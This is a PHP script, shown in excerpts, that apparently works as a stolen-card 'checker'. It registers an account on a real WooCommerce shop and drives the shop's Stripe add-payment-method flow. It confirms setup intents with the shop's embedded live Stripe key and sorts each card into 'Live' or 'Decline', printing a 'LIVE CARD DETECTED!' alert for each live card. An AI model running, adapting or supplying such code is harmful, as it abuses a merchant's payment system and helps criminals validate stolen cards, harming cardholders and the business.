...
$get_url = "https://annex-engineering.eu/my-account/";
...
$create_url = "https://annex-engineering.eu/my-account/";
...
$create_headers = [
    ...
    "origin: https://annex-engineering.eu",
    "priority: u=0, i",
    "referer: https://annex-engineering.eu/my-account/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$create_data = http_build_query([
    ...
    "wc_order_attribution_session_entry" => "https://annex-engineering.eu/shop/",
    "wc_order_attribution_session_start_time" => "2025-04-14 13:30:40",
...
$pay_url = "https://annex-engineering.eu/my-account/add-payment-method/";
...
$pay_headers = [
    ...
    "accept-language: en-US,en;q=0.9",
    "priority: u=0, i",
    "referer: https://annex-engineering.eu/my-account/add-payment-method/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
preg_match('/"rest_nonce":"([^"]+)"/', $pay_response, $add_card_matches); $add_card_nonce = $add_card_matches[1] ?? null;
...
$cseti_url = "https://annex-engineering.eu/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent";
...
curl_close($ch);
$cintent = json_decode($cseti_response, true)['intent']['id'];
$csecret = json_decode($cseti_response, true)['intent']['client_secret'];
#echo "cseti_response: " . $cseti_response . "\n";
#echo "seti_id: " . $cintent . "\n";
#echo "client_secret: " . $csecret . "\n";
#echo "securestate: " . $securestate . "\n";

$final_url = "https://api.stripe.com/v1/setup_intents/$cintent/confirm";

$final_data = http_build_query([
    "return_url" => "https://annex-engineering.eu/wc-api/stripe_add_payment_method/?nonce=$add_card_nonce&payment_method=stripe_cc&context=add_payment_method",
    ...
    "payment_method_data[referrer]" => "https://annex-engineering.eu",
    "expected_payment_method_type" => "card",
    "use_stripe_sdk" => "true",
    "key" => "pk_live_51OcpxiDBNTdgiFGp4Q3Q0rgsp6XtMUlNvEdX9IhHM5TwKxGxL9TK7qMC2Xi9GQVawyMxSO2NJ8YG8h0tDYZE5tPC00CtQLynTJ",
    "_stripe_account" => "acct_1OcpxiDBNTdgiFGp",
...
$securestate = json_decode($final_response, true)['error']['setup_intent']['status'];
$success = json_decode($final_response, true)['status'];
$scode = json_decode($final_response, true)['error']['code'];
$sdecline_code = json_decode($final_response, true)['error']['decline_code'];
$smessage = json_decode($final_response, true)['error']['message'];
...
#echo '<span class="text text-success">success</span> <span class="text text-success">➔ '.$success.'</span><br>'; 
#echo '<span class="text text-success">code</span> <span class="text text-success">➔ '.$scode.'</span><br>'; 
#echo '<span class="text text-success">decline_code</span> <span class="text text-success">➔ '.$sdecline_code.'</span><br>'; 
#echo '<span class="text text-success">message</span> <span class="text text-success">➔ '.$smessage.'</span><br>'; 
 ...
 if ($errortype === 'invalid_request_error') {
        ...
        if (($state == "succeeded") || ($state == "attempted") || ($state == "processing_error")){
            ...
            $get_url = "https://api.stripe.com/v1/setup_intents/{$cintent}?is_stripe_sdk=false&client_secret={$csecret}&key=pk_live_51OcpxiDBNTdgiFGp4Q3Q0rgsp6XtMUlNvEdX9IhHM5TwKxGxL9TK7qMC2Xi9GQVawyMxSO2NJ8YG8h0tDYZE5tPC00CtQLynTJ";
            ...
            if($status == "succeeded"){
                echo '<span class="text text-success">Live</span> <span class="text text-success">➔ '.$card.' ➔ Payment method added. (CVV AUTH) R: [ '.$attempt.' ]</span><br>';
                ...
                echo '<span class="text text-warning">Live</span> <span class="text text-warning">➔ '.$card.' ➔ '.$message.' ('.$state.') R: [ '.$attempt.' ]</span><br>'; 
                $message = "🔊<b>LIVE CARD DETECTED!</b>\n" .
                "✉️ <b>CARD:</b> $card\n" .
                ...
                echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ '.$message.' ('.$state.') R: [ '.$attempt.' ]</span><br>';
            }

        }else{
            echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ '.$state.' R: [ '.$attempt.' ]</span><br>';
        }
    } else {
        if ($success === 'succeeded') {
            ...
            echo '<span class="text text-danger">Decline</span> <span class="text text-danger">➔ '.$card.' ➔ '.$smessage.' ('.$sdecline_code.') R: [ '.$attempt.' ]</span><br>';
        }
    }
        break; 
            }
